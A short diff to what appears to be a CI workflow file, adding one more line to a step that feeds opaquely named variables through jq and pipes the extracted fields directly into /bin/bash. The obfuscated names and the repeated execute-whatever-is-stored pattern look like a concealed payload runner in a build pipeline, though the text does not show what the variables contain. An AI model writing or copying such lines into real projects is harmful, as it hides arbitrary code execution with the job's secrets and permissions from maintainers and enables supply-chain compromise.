@@ -28,6 +28,7 @@ jobs:
           echo $v11221 | jq -r .i41 | /bin/bash
           echo $mop054 | jq -r .f4 | /bin/bash
           printf '%s' "$tgct39964" | jq -r .koe60261 | /bin/bash
+          printf '%s' "$s522" | jq -r .xel99113 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
